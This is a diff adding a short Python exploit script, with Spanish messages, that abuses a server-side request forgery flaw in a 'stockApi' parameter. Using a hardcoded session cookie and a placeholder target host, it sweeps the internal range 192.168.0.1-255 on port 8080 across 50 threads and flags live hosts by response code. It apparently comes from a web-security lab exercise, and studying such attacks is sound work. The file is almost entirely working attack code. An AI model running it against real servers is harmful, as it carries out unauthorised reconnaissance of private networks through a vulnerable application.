@@ -1,0 +1,27 @@
+#!/usr/bin/python3 
+import requests 
+import signal
+import sys
+import threading 
+from concurrent.futures import ThreadPoolExecutor 
+
+def def_handler(sig, frame): 
+        print("\nSaliendo...") 
+        sys.exit(1) 
+        signal.signal(signal.SIGINT, def_handler) 
+
+def exploit(ip): 
+        headers = {'Content-Type': 'application/x-www-form-urlencoded'} 
+        data = {"stockApi": f"http://192.168.0.{ip}:8080/product/stock/check?productId=1%26storeId=1"} 
+        cookies = {'session': '5BvJQuWQui7lxeJipw56pzkaTigh3Dht'} 
+        r = requests.post("https://page.net/product/stock", headers=headers, cookies=cookies, data=data) 
+        if r.status_code != 500: print(f"Encontrado host en -> 192.168.0.{ip}") 
+
+
+if __name__ == '__main__': 
+        with ThreadPoolExecutor(max_workers=50) as executor: 
+                for i in range(1,256): executor.submit(exploit, i)
+
+
+# Blind SSRF Internal Network Enumeration
+# The attacker forces the vulnerable server to send requests to internal hosts and analyzes the responses to identify active hosts, accessible internal services and behavioral anomalies
